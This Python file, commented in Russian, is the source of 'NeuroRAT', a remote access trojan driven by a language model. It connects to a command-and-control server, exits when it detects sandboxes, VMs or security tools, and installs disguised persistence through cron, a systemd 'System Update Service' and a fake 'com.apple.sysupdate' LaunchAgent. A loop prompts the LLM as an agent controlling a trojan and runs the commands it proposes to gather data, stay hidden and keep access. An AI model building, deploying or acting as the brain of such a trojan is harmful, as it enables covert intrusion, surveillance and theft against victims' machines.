#!/usr/bin/env python3
"""
NeuroRAT - Троян нового поколения с интеграцией LLM для автономного принятия решений.
Объединяет возможности agent_protocol с техниками обхода AV из TheFatRat, Unicorn, Veil и Phantom-Evasion.
"""

import os
import sys
import time
import json
import random
import logging
import argparse
import threading
from typing import Dict, Any, Optional, List, Tuple, Union

from agent_protocol.agent import Agent
from agent_protocol.shared.protocol import Command, Response, CommandType
from agent_protocol.modules.av_evasion import AVEvasion
from agent_protocol.modules.llm_interface import LLMInterface

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(os.path.expanduser("~/.neurorat.log")),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('neurorat')

class NeuroRAT:
    """
    Основной класс для управления троянской системой с LLM-интеграцией.
    """
    
    def __init__(
        self,
        server_host: str,
        server_port: int,
        agent_id: Optional[str] = None,
        auth_token: Optional[str] = None,
        use_ssl: bool = True,
        ca_cert: Optional[str] = None,
        llm_api_type: str = "ollama",
        llm_api_base: str = "http://localhost:11434",
        llm_model: str = "llama2",
        llm_api_key: Optional[str] = None,
        stealth_mode: bool = True,
        evasion_level: int = 2,
        persist: bool = False
    ):
        """
        Инициализация NeuroRAT.
        
        Параметры:
        - server_host: Адрес сервера управления
        - server_port: Порт сервера управления
        - agent_id: ID агента (генерируется, если не указан)
        - auth_token: Токен аутентификации
        - use_ssl: Использовать ли SSL для соединения
        - ca_cert: Путь к CA-сертификату
        - llm_api_type: Тип API для LLM
        - llm_api_base: Базовый URL для LLM API
        - llm_model: Имя модели LLM
        - llm_api_key: API-ключ для LLM (если требуется)
        - stealth_mode: Режим скрытности
        - evasion_level: Уровень обхода AV (1-3)
        - persist: Установить механизм персистентности
        """
        self.server_host = server_host
        self.server_port = server_port
        self.agent_id = agent_id or self._generate_agent_id()
        self.auth_token = auth_token
        self.use_ssl = use_ssl
        self.ca_cert = ca_cert
        self.stealth_mode = stealth_mode
        self.evasion_level = evasion_level
        self.persist = persist
        
        # Инициализация агента
        self.agent = Agent(
            server_host=server_host,
            server_port=server_port,
            agent_id=self.agent_id,
            auth_token=self.auth_token,
            use_ssl=use_ssl,
            ca_cert=ca_cert
        )
        
        # Регистрация обработчика LLM-запросов
        self.agent.command_handlers[CommandType.LLM_QUERY] = self._handle_llm_query
        
        # Инициализация LLM-интерфейса
        self.llm = LLMInterface(
            api_type=llm_api_type,
            api_base=llm_api_base,
            model=llm_model,
            api_key=llm_api_key
        )
        
        # Состояние
        self.running = False
        self.tasks = []
        self.environment_info = {}
        
        # Инициализация "нейронного" состояния
        self.neural_state = {
            "stealth_level": "high" if stealth_mode else "normal",
            "decision_autonomy": "medium",  # low, medium, high
            "risk_acceptance": "low",       # low, medium, high
            "persistence_enabled": persist,
            "connection_frequency": random.randint(5, 15),  # минуты
            "last_environment_check": 0,
            "detected_security_tools": [],
            "potential_detection_events": []
        }
    
    def _generate_agent_id(self) -> str:
        """
        Генерация уникального ID агента.
        
        Возвращает:
        - Уникальный ID
        """
        import socket
        import uuid
        import hashlib
        
        # Получение данных о машине
        hostname = socket.gethostname()
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                         for elements in range(0, 2*6, 2)][::-1])
        username = os.getenv("USER", "unknown")
        
        # Создание хеша
        machine_id = f"{hostname}:{mac}:{username}:{os.getpid()}"
        return hashlib.md5(machine_id.encode()).hexdigest()
    
    def _handle_llm_query(self, command: Command) -> Response:
        """
        Обработка LLM-запроса.
        
        Параметры:
        - command: Команда от сервера управления
        
        Возвращает:
        - Ответ с результатом выполнения
        """
        try:
            # Проверяем наличие запроса
            if "query" not in command.data:
                return Response(
                    command_id=command.command_id,
                    success=False,
                    error_message="Missing query parameter",
                    data={}
                )
            
            # Получаем параметры
            query = command.data["query"]
            context = command.data.get("context", {})
            autonomous = command.data.get("autonomous", False)
            
            # Если режим автономный, выполняем команды автоматически
            if autonomous:
                result = self.llm.interactive_command_execution(query)
                return Response(
                    command_id=command.command_id,
                    success=True,
                    data=result
                )
            else:
                # Просто получаем ответ от LLM без выполнения команд
                llm_response = self.llm.query(query, context=context)
                
                # Парсим команды для информации
                commands = self.llm.parse_commands(llm_response["content"])
                
                return Response(
                    command_id=command.command_id,
                    success=True,
                    data={
                        "llm_response": llm_response,
                        "parsed_commands": commands,
                        "message": "Commands were not executed automatically. Set autonomous=true to enable execution."
                    }
                )
        
        except Exception as e:
            logger.error(f"Error processing LLM query: {str(e)}")
            return Response(
                command_id=command.command_id,
                success=False,
                error_message=f"LLM query processing error: {str(e)}",
                data={}
            )
    
    def start(self) -> bool:
        """
        Запуск NeuroRAT.
        
        Возвращает:
        - True, если запуск успешен
        """
        try:
            # Если мы в режиме скрытности, проверяем окружение
            if self.stealth_mode:
                self._check_environment()
                if self._is_in_hostile_environment():
                    logger.warning("Detected hostile environment. Exiting.")
                    return False
            
            # Применяем механизм персистентности
            if self.persist:
                self._setup_persistence()
            
            # Запускаем агента
            self.agent.start()
            
            # Запускаем собственные фоновые потоки
            self.running = True
            threading.Thread(target=self._autonomous_decision_loop, daemon=True).start()
            threading.Thread(target=self._environment_monitoring_loop, daemon=True).start()
            
            logger.info(f"NeuroRAT started successfully with agent_id: {self.agent_id}")
            return True
            
        except Exception as e:
            logger.error(f"Error starting NeuroRAT: {str(e)}")
            return False
    
    def stop(self) -> bool:
        """
        Остановка NeuroRAT.
        
        Возвращает:
        - True, если остановка успешна
        """
        try:
            self.running = False
            
            # Останавливаем агента
            self.agent.stop()
            
            logger.info("NeuroRAT stopped successfully")
            return True
            
        except Exception as e:
            logger.error(f"Error stopping NeuroRAT: {str(e)}")
            return False
    
    def _check_environment(self) -> Dict[str, Any]:
        """
        Проверка окружения на наличие средств обнаружения.
        
        Возвращает:
        - Информацию об окружении
        """
        import platform
        import subprocess
        
        # Базовая информация
        self.environment_info = {
            "os": platform.system(),
            "release": platform.release(),
            "version": platform.version(),
            "architecture": platform.machine(),
            "hostname": platform.node(),
            "security_tools": [],
            "virtualization": False,
            "debugger": False,
            "time": time.time()
        }
        
        # Проверка на виртуализацию
        vm_indicators = []
        
        # Linux-специфичные проверки
        if platform.system() == "Linux":
            # Проверка /proc/cpuinfo на признаки виртуализации
            try:
                with open("/proc/cpuinfo", "r") as f:
                    cpuinfo = f.read().lower()
                    if any(x in cpuinfo for x in ["vmware", "virtualbox", "qemu", "kvm", "xen"]):
                        vm_indicators.append("cpuinfo")
            except:
                pass
            
            # Проверка dmesg
            try:
                dmesg = subprocess.check_output("dmesg | grep -i virtual", shell=True, text=True)
                if dmesg.strip():
                    vm_indicators.append("dmesg")
            except:
                pass
            
            # Проверка на наличие средств безопасности
            security_tools = [
                "clamav", "rkhunter", "chkrootkit", "snort", "wireshark", 
                "tcpdump", "ossec", "aide", "tripwire", "lynis"
            ]
            
            for tool in security_tools:
                try:
                    result = subprocess.run(
                        f"which {tool}",
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    if result.returncode == 0:
                        self.environment_info["security_tools"].append(tool)
                except:
                    pass
        
        # macOS-специфичные проверки
        elif platform.system() == "Darwin":
            # Проверка на виртуализацию
            try:
                sysctl = subprocess.check_output("sysctl -a | grep -i vmware", shell=True, text=True)
                if sysctl.strip():
                    vm_indicators.append("sysctl")
            except:
                pass
            
            # Проверка на наличие средств безопасности
            security_tools = [
                "litte snitch", "wireshark", "tcpdump", "xprotect", 
                "carbonblack", "crowdstrike", "xnumon"
            ]
            
            for tool in security_tools:
                try:
                    result = subprocess.run(
                        f"ls /Applications | grep -i '{tool}'",
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    if result.returncode == 0:
                        self.environment_info["security_tools"].append(tool)
                except:
                    pass
        
        # Windows-специфичные проверки
        elif platform.system() == "Windows":
            # Проверки для Windows можно добавить позже
            pass
        
        # Обновляем состояние
        self.environment_info["virtualization"] = len(vm_indicators) > 0
        self.neural_state["detected_security_tools"] = self.environment_info["security_tools"]
        self.neural_state["last_environment_check"] = time.time()
        
        return self.environment_info
    
    def _is_in_hostile_environment(self) -> bool:
        """
        Проверка, находится ли агент в потенциально вредном окружении.
        
        Возвращает:
        - True, если обнаружены признаки опасного окружения
        """
        # Если найдено более 2 средств безопасности, считаем окружение недружественным
        security_tools_threshold = 2
        if len(self.environment_info.get("security_tools", [])) > security_tools_threshold:
            return True
        
        # Если обнаружены признаки виртуализации и оистема запущена для анализа, это может быть песочница
        if self.environment_info.get("virtualization", False):
            # Дополнительные проверки на песочницу
            # Например, малое время работы системы может указывать на анализ
            uptime = 0
            try:
                with open("/proc/uptime", "r") as f:
                    uptime = float(f.read().split()[0])
            except:
                pass
            
            # Если система запущена менее 10 минут, это может быть песочница
            if 0 < uptime < 600:  # 10 минут в секундах
                return True
        
        # Если обнаружены признаки отладчика, это опасно
        if self.environment_info.get("debugger", False):
            return True
        
        return False
    
    def _setup_persistence(self) -> bool:
        """
        Настройка механизма персистентности.
        
        Возвращает:
        - True, если установка успешна
        """
        import platform
        import shutil
        import subprocess
        
        try:
            # Определяем текущий исполняемый файл
            current_executable = sys.executable
            current_script = os.path.abspath(sys.argv[0])
            
            if platform.system() == "Linux":
                # Копирование в ~/.local/bin
                user_bin_dir = os.path.expanduser("~/.local/bin")
                os.makedirs(user_bin_dir, exist_ok=True)
                
                target_script = os.path.join(user_bin_dir, ".sysupdate.py")
                shutil.copy2(current_script, target_script)
                os.chmod(target_script, 0o755)
                
                # Создание записи в crontab
                cron_cmd = f"(crontab -l 2>/dev/null; echo '@reboot {current_executable} {target_script}') | crontab -"
                subprocess.run(cron_cmd, shell=True, check=True)
                
                # Создание systemd user service
                service_dir = os.path.expanduser("~/.config/systemd/user")
                os.makedirs(service_dir, exist_ok=True)
                
                service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
ExecStart={current_executable} {target_script}
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
"""
                
                with open(os.path.join(service_dir, "sysupdate.service"), "w") as f:
                    f.write(service_content)
                
                subprocess.run("systemctl --user enable sysupdate.service", shell=True, check=True)
                
                return True
                
            elif platform.system() == "Darwin":
                # Создание plist для Launch Agent
                launch_agents_dir = os.path.expanduser("~/Library/LaunchAgents")
                os.makedirs(launch_agents_dir, exist_ok=True)
                
                plist_file = os.path.join(launch_agents_dir, "com.apple.sysupdate.plist")
                plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.sysupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>{current_executable}</string>
        <string>{current_script}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
</dict>
</plist>"""
                
                with open(plist_file, "w") as f:
                    f.write(plist_content)
                
                subprocess.run(f"launchctl load {plist_file}", shell=True, check=True)
                
                return True
                
            elif platform.system() == "Windows":
                # Для Windows можно использовать реестр или планировщик задач
                # Этот код будет добавлен позднее
                return False
            
            return False
            
        except Exception as e:
            logger.error(f"Error setting up persistence: {str(e)}")
            return False
    
    def _autonomous_decision_loop(self):
        """
        Поток для автономного принятия решений на основе LLM.
        """
        while self.running:
            try:
                # Только если уровень автономии средний или высокий
                if self.neural_state["decision_autonomy"] in ["medium", "high"]:
                    # Собираем текущую информацию об окружении
                    system_info = self._collect_system_info()
                    
                    # Формируем запрос к LLM для принятия решений
                    prompt = f"""
Ты АИ-агент, управляющий троянской программой на удаленной системе. Вот информация о ней:
Система: {system_info.get('os', 'Unknown')}
Хост: {system_info.get('hostname', 'Unknown')}
Время работы: {system_info.get('uptime', 'Unknown')}
Сетевые интерфейсы: {system_info.get('network', 'Unknown')}

Текущее состояние:
- Обнаружены средства безопасности: {', '.join(self.neural_state['detected_security_tools']) or 'нет'}
- Уровень скрытности: {self.neural_state['stealth_level']}
- Уровень риска: {self.neural_state['risk_acceptance']}

Предложи 1-2 действия, которые стоит выполнить в текущей ситуации для:
1. Сбора важной информации
2. Обеспечения скрытности
3. Поддержания доступа к системе

Используй формат команд для автоматического выполнения.
"""
                    
                    # Получаем рекомендации от LLM
                    if random.random() < 0.3:  # Выполняем не каждый раз для снижения активности
                        logger.info("Querying LLM for autonomous decisions")
                        result = self.llm.interactive_command_execution(prompt)
                        
                        # Логируем результаты, но не выполняем рискованные команды
                        if result["execution_results"]["failed"]:
                            logger.warning("Some autonomous commands failed to execute")
                
                # Ждем случайное время для неравномерной активности
                sleep_time = random.uniform(60, 300)  # 1-5 минут
                time.sleep(sleep_time)
                
            except Exception as e:
                logger.error(f"Error in autonomous decision loop: {str(e)}")
                time.sleep(60)  # В случае ошибки ждем 1 минуту
    
    def _environment_monitoring_loop(self):
        """
        Поток для мониторинга окружения на предмет изменений и обнаружения.
        """
        while self.running:
            try:
                # Периодически проверяем окружение
                if time.time() - self.neural_state["last_environment_check"] > 3600:  # Раз в час
                    self._check_environment()
                
                # Проверяем, не стало ли окружение враждебным
                if self._is_in_hostile_environment():
                    logger.warning("Environment became hostile")
                    
                    # В зависимости от настроек риска предпринимаем действия
                    if self.neural_state["risk_acceptance"] == "low":
                        logger.info("Low risk acceptance - stopping operation")
                        self.stop()
                        break
                    else:
                        # Увеличиваем уровень скрытности
                        self.neural_state["stealth_level"] = "maximum"
                        self.neural_state["connection_frequency"] = random.randint(15, 30)  # Реже подключаемся
                
                # Ждем некоторое время
                time.sleep(random.uniform(300, 600))  # 5-10 минут
                
            except Exception as e:
                logger.error(f"Error in environment monitoring loop: {str(e)}")
                time.sleep(60)  # В случае ошибки ждем 1 минуту
    
    def _collect_system_info(self) -> Dict[str, Any]:
        """
        Сбор информации о системе для автономного принятия решений.
        
        Возвращает:
        - Словарь с информацией о системе
        """
        import platform
        import subprocess
        
        info = {
            "os": platform.system(),
            "release": platform.release(),
            "hostname": platform.node(),
            "uptime": "unknown",
            "network": "unknown"
        }
        
        try:
            # Время работы системы
            if platform.system() == "Linux":
                with open("/proc/uptime", "r") as f:
                    uptime_seconds = float(f.read().split()[0])
                    hours, remainder = divmod(uptime_seconds, 3600)
                    minutes, seconds = divmod(remainder, 60)
                    info["uptime"] = f"{int(hours)}h {int(minutes)}m"
            
            # Сетевые интерфейсы
            if platform.system() in ["Linux", "Darwin"]:
                result = subprocess.run(
                    "ip addr | grep 'inet ' | grep -v '127.0.0.1'",
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                if result.returncode == 0:
                    info["network"] = result.stdout.strip()
        except:
            pass
        
        return info


def main():
    """Основная функция для запуска NeuroRAT."""
    parser = argparse.ArgumentParser(description="NeuroRAT - AI-powered RAT")
    parser.add_argument("--server", default="localhost", help="C2 server address")
    parser.add_argument("--port", type=int, default=8000, help="C2 server port")
    parser.add_argument("--agent-id", help="Agent ID (generated if not provided)")
    parser.add_argument("--token", help="Authentication token")
    parser.add_argument("--no-ssl", action="store_true", help="Disable SSL")
    parser.add_argument("--llm-api", default="ollama", help="LLM API type")
    parser.add_argument("--llm-base", default="http://localhost:11434", help="LLM API base URL")
    parser.add_argument("--llm-model", default="llama2", help="LLM model name")
    parser.add_argument("--llm-key", help="LLM API key")
    parser.add_argument("--no-stealth", action="store_true", help="Disable stealth mode")
    parser.add_argument("--evasion", type=int, default=2, choices=[1, 2, 3], help="AV evasion level")
    parser.add_argument("--persist", action="store_true", help="Enable persistence")
    
    args = parser.parse_args()
    
    # Создание и запуск NeuroRAT
    rat = NeuroRAT(
        server_host=args.server,
        server_port=args.port,
        agent_id=args.agent_id,
        auth_token=args.token,
        use_ssl=not args.no_ssl,
        llm_api_type=args.llm_api,
        llm_api_base=args.llm_base,
        llm_model=args.llm_model,
        llm_api_key=args.llm_key,
        stealth_mode=not args.no_stealth,
        evasion_level=args.evasion,
        persist=args.persist
    )
    
    if rat.start():
        logger.info("NeuroRAT started successfully")
        
        try:
            # Держим программу запущенной
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            logger.info("Stopping NeuroRAT...")
            rat.stop()
    else:
        logger.error("Failed to start NeuroRAT")
        sys.exit(1)


if __name__ == "__main__":
    main() 